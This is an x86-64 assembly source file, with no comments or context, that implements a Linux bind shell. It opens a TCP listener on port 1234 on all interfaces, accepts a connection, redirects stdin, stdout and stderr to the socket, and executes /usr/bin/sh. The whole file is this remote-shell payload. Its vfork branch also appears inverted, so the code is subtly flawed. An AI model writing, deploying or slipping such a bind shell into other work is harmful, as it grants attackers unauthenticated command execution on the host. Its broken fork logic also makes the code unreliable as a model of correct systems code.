%define SYS_close	2
%define SYS_dup2	33
%define SYS_socket	41
%define SYS_accept	43
%define SYS_bind	49
%define SYS_listen	50
%define SYS_setsockopt	54
%define SYS_fork	57
%define SYS_vfork	58
%define SYS_execve	59
%define SYS_exit	60
%define SYS_wait4	61
%define SYS_accept4	288

%define STDIN_FILENO	0
%define STDOUT_FILENO	1
%define STDERR_FILENO	2

%define AF_INET		2

%define SOCK_STREAM	1

%define SOL_SOCKET	1

%define SO_REUSEADDR	2
%define SO_REUSEPORT	15

%define stack_size	(4 + 4 + 16 + 16 + 4 + 4 + 4 + 8 + 12)
%define sock_serv	stack_size
%define sock_opt	(sock_serv + 4)
%define addr_serv	(sock_opt + 16)
%define addr_client	(addr_serv + 16)
%define addr_client_len	(addr_client + 4)
%define sock_client	(addr_client_len + 4)
%define pid		(sock_client + 4)
%define args		(pid + 8)
%define sh_path		(args + 12)
%define addr_family	0
%define addr_addr	4
%define addr_port	2

%define	SERV_ADDR	0
%define SERV_PORT	0xd204 

section .text
global _start
_start:
	nop
	nop

	push	rbp
	mov	rbp, rsp
	sub	rsp, stack_size

	mov	rax, SYS_socket
	mov	rdi, AF_INET
	mov	rsi, SOCK_STREAM
	mov	rdx, 0
	syscall
	cmp	rax, -1
	je	_start_err
	mov	dword [rbp - sock_serv], eax

	mov	dword [rbp - sock_opt], 1
	mov	rax, SYS_setsockopt
	mov	edi, dword [rbp - sock_serv]
	mov	rsi, SOL_SOCKET
	mov	rdx, SO_REUSEADDR
	lea	r10, [rbp - sock_opt]
	mov	r8, 4
	syscall	
	cmp	rax, -1
	je	_start_err

	mov	dword [rbp - sock_opt], 1
	mov	rax, SYS_setsockopt
	mov	edi, dword [rbp - sock_serv]
	mov	rsi, SOL_SOCKET
	mov	rdx, SO_REUSEPORT
	lea	r10, [rbp - sock_opt]
	mov	r8, 4
	syscall	
	cmp	rax, -1
	je	_start_err

	mov	qword [rbp - addr_serv + 0], 0
	mov	qword [rbp - addr_serv + 8], 0
	mov	word [rbp - addr_serv + addr_family], AF_INET
	mov	dword [rbp - addr_serv + addr_addr], SERV_ADDR
	mov	word [rbp - addr_serv + addr_port], SERV_PORT
	
	mov	rax, SYS_bind
	mov	edi, dword [rbp - sock_serv]
	lea	rsi, byte [rbp - addr_serv]
	mov	rdx, 16
	syscall
	cmp	rax, -1
	je	_start_err

	mov	rax, SYS_listen
	mov	edi, dword [rbp - sock_serv]
	mov	rsi, 1
	syscall
	cmp	rax, -1
	je	_start_err

	mov	rax, SYS_accept
	mov	edi, dword [rbp - sock_serv]
	lea	rsi, byte [rbp - addr_client]
	lea	rdx, byte [rbp - addr_client_len]
	syscall
	cmp	rax, -1
	je	_start_err
	mov	dword [rbp - sock_client], eax

	mov	rax, SYS_vfork
	syscall
	cmp	rax, -1
	je	_start_err
	mov	dword [rbp - pid], eax

	cmp	dword [rbp - pid], 0
	je	_start_parent

	mov	rax, SYS_dup2
	mov	edi, dword [rbp - sock_client]
	mov	rsi, STDIN_FILENO
	syscall

	mov	rax, SYS_dup2
	mov	edi, dword [rbp - sock_client]
	mov	rsi, STDOUT_FILENO
	syscall

	mov	rax, SYS_dup2
	mov	edi, dword [rbp - sock_client]
	mov	rsi, STDERR_FILENO
	syscall

	mov	byte [rbp - sh_path + 0], '/'
	mov	byte [rbp - sh_path + 1], 'u'
	mov	byte [rbp - sh_path + 2], 's'
	mov	byte [rbp - sh_path + 3], 'r'
	mov	byte [rbp - sh_path + 4], '/'
	mov	byte [rbp - sh_path + 5], 'b'
	mov	byte [rbp - sh_path + 6], 'i'
	mov	byte [rbp - sh_path + 7], 'n'
	mov	byte [rbp - sh_path + 8], '/'
	mov	byte [rbp - sh_path + 9], 's'
	mov	byte [rbp - sh_path + 10], 'h'
	mov	byte [rbp - sh_path + 11], 0
	mov	qword [rbp - args], 0

	mov	rax, SYS_execve
	lea	rdi, [rbp - sh_path]
	lea	rsi, [rbp - args]
	lea	rdx, [rbp - args]
	syscall
	cmp	rax, -1
	je	_start_err

	mov	rax, SYS_exit
	mov	rdi, 1
	syscall

_start_parent:
	mov	rax, SYS_wait4
	mov	rdi, 0
	syscall

	mov	rax, SYS_close
	mov	edi, dword [rbp - sock_client]
	syscall

	mov	rax, SYS_close
	mov	edi, dword [rbp - sock_serv]
	syscall
_start_err:
	leave
	ret
